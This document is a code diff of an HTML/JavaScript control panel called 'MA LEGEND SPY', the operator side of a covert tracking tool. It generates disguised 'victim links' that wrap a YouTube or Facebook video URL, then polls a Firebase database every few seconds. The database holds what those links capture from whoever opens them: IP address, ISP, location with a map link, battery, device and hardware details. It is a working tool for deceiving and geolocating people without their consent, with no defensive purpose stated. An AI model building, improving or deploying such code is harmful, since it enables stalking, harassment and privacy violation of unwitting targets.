@@ -2,119 +2,85 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MA LEGEND | SUPREME CONTROL</title>
+    <title>MA LEGEND | SUPREME ADMIN</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
-        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; display: flex; justify-content: center; padding: 20px; }
-        .container { width: 100%; max-width: 500px; }
-        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
-        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; letter-spacing: 2px; font-size: 1.2rem; }
-        label { font-size: 0.7rem; font-weight: bold; margin-left: 10px; }
-        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #cbcbe1, inset -6px -6px 12px #ffffff; outline: none; margin: 10px 0; box-sizing: border-box; font-family: 'Poppins'; }
-        
-        /* Buttons Style */
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
-        .btn:active { box-shadow: inset 4px 4px 8px #bcbfc5, inset -4px -4px 8px #ffffff; }
-        .btn-copy { background: #00a884; color: white; margin-top: 5px; font-size: 0.8rem; }
-        
-        .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 20px; font-size: 0.75rem; border-left: 6px solid #00a884; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(0,0,0,0.05); padding: 5px 0; }
-        .row b { color: #00a884; }
-        #copy-msg { font-size: 0.6rem; color: #00a884; text-align: center; display: none; margin-top: 5px; font-weight: bold; }
+        body { background: #121212; color: #eee; font-family: 'Poppins', sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .card { background: #1e1e1e; padding: 25px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px; }
+        h1 { font-family: 'Orbitron'; color: #00ffcc; text-align: center; font-size: 1.2rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: #00ffcc; outline: none; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; transition: 0.3s; margin-top: 10px; }
+        .btn:active { transform: scale(0.98); }
+        .log-box { background: #181818; padding: 15px; border-radius: 12px; border-left: 4px solid #00ffcc; margin-top: 15px; font-size: 0.8rem; line-height: 1.6; animation: fadeIn 0.5s ease; }
+        .log-box b { color: #00ffcc; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="neu-card">
-            <h2>MA LEGEND SPY</h2>
-            <p style="text-align:center; font-size:10px; opacity:0.6;">MULTI-USER PRIVACY ENABLED</p>
+        <div class="card">
+            <h1>MA LEGEND CONTROL</h1>
+            <input type="text" id="userKey" placeholder="Enter Your Secret Key (e.g. Legend786)">
+            <input type="text" id="targetUrl" placeholder="Paste Video Link (YouTube/FB)">
+            <button class="btn" onclick="generate()">GENERATE SPY LINK</button>
             
-            <label>YOUR SECRET KEY (User ID):</label>
-            <input type="text" id="user-key" placeholder="Enter your unique name/ID...">
-            
-            <label>TARGET VIDEO LINK:</label>
-            <input type="text" id="vid-url" placeholder="YouTube, FB, or any video link...">
-            
-            <button class="btn" onclick="generateLink()">GENERATE VICTIM LINK</button>
-            
-            <div id="result-box" style="display:none; margin-top:20px;">
-                <label>VICTIM LINK:</label>
-                <input type="text" id="final-link" readonly>
-                <button class="btn btn-copy" onclick="copyToClipboard()">COPY LINK</button>
-                <p id="copy-msg">LENGEND! LINK COPIED TO CLIPBOARD</p>
+            <div id="result" style="display:none; margin-top:20px;">
+                <input type="text" id="finalLink" readonly>
+                <button class="btn" style="background:#333; color:#fff;" onclick="copy()">COPY LINK</button>
             </div>
         </div>
 
-        <div class="neu-card">
-            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH MY PRIVATE LOGS</button>
-            <div id="logs-container"></div>
+        <div id="logsContainer">
+            <p style="text-align:center; color:#666;">Waiting for logs... Enter key to see activity.</p>
         </div>
     </div>
 
-    <audio id="ping" src="https://www.myinstants.com/media/sounds/notification.mp3"></audio>
-
     <script>
-        const FB_URL = "https://legend-tricker-default-rtdb.asia-southeast1.firebasedatabase.app/users/";
-        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; 
+        // Aapka Naya Firebase URL
+        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/users/";
+        const VICTIM_DOMAIN = "https://video-obtg.vercel.app/";
 
-        let lastCount = 0;
-
-        function generateLink() {
-            const key = document.getElementById('user-key').value.trim();
-            const vid = document.getElementById('vid-url').value.trim();
-            if(!key || !vid) return alert("Please fill both fields!");
-
-            const encoded = btoa(key + "|" + vid);
-            document.getElementById('final-link').value = VICTIM_PAGE + "?id=" + encoded;
-            document.getElementById('result-box').style.display = 'block';
-            document.getElementById('copy-msg').style.display = 'none';
+        function generate() {
+            const key = document.getElementById('userKey').value.trim();
+            const url = document.getElementById('targetUrl').value.trim();
+            if(!key || !url) return alert("Fill all fields!");
+            const encoded = btoa(key + "|" + url);
+            document.getElementById('finalLink').value = VICTIM_DOMAIN + "?id=" + encoded;
+            document.getElementById('result').style.display = 'block';
         }
 
-        function copyToClipboard() {
-            const copyText = document.getElementById("final-link");
-            copyText.select();
-            copyText.setSelectionRange(0, 99999); // Mobile ke liye
-            navigator.clipboard.writeText(copyText.value);
-            
-            const msg = document.getElementById("copy-msg");
-            msg.style.display = "block";
-            setTimeout(() => { msg.style.display = "none"; }, 2000);
+        function copy() {
+            const link = document.getElementById('finalLink');
+            link.select();
+            document.execCommand("copy");
+            alert("Link Copied!");
         }
 
         async function fetchLogs() {
-            const key = document.getElementById('user-key').value.trim();
-            if(!key) return alert("Enter your Key first!");
-
+            const key = document.getElementById('userKey').value.trim();
+            if(!key) return;
             try {
-                const res = await fetch(`${FB_URL}${key}.json`);
+                const res = await fetch(`${DB_URL}${key}.json`);
                 const data = await res.json();
-                const container = document.getElementById('logs-container');
-                container.innerHTML = "";
-
-                if(!data) { container.innerHTML = "<p style='text-align:center;'>No logs found for this Key.</p>"; return; }
-
-                if(Object.keys(data).length > lastCount && lastCount !== 0) document.getElementById('ping').play();
-                lastCount = Object.keys(data).length;
-
+                const container = document.getElementById('logsContainer');
+                
+                if(!data) return;
+                container.innerHTML = `<h3 style="color:#888; font-size:0.9rem;">Live Logs for: ${key}</h3>`;
                 Object.keys(data).reverse().forEach(id => {
                     const l = data[id];
                     container.innerHTML += `
-                        <div class="log-card">
-                            <div class="row"><b>🕒 Time:</b> <span>${l.time}</span></div>
-                            <div class="row"><b>📱 Device:</b> <span>${l.dev}</span></div>
-                            <div class="row"><b>🌐 IP:</b> <span>${l.ip}</span></div>
-                            <div class="row"><b>📍 Location:</b> <span>${l.loc}</span></div>
-                            <div class="row"><b>📡 ISP:</b> <span>${l.isp}</span></div>
-                            <div class="row"><b>🔋 Battery:</b> <span>${l.batt}</span></div>
-                            <div class="row"><b>🧠 Hardware:</b> <span>${l.cpu} Core | ${l.ram}GB RAM</span></div>
-                            <div class="row"><b>🖥️ GPU:</b> <span>${l.gpu}</span></div>
-                            <a href="${l.map}" target="_blank" style="display:block; text-align:center; background:#00a884; color:#fff; padding:10px; border-radius:10px; text-decoration:none; margin-top:10px; font-weight:bold;">VIEW ON MAP</a>
+                        <div class="log-box">
+                            <b>🕒 Time:</b> ${l.time}<br>
+                            <b>🌐 IP:</b> ${l.ip} | <b>📍 Loc:</b> ${l.loc}<br>
+                            <b>📱 Device:</b> ${l.dev}<br>
+                            <b>🧠 Hardware:</b> ${l.cpu} Core | ${l.ram}GB RAM<br>
+                            <a href="${l.map}" target="_blank" style="color:#00ffcc;">📍 View Exact Location on Map</a>
                         </div>`;
                 });
-            } catch(e) { alert("Error fetching data!"); }
+            } catch(e) {}
         }
+        setInterval(fetchLogs, 4000);
     </script>
 </body>
 </html>
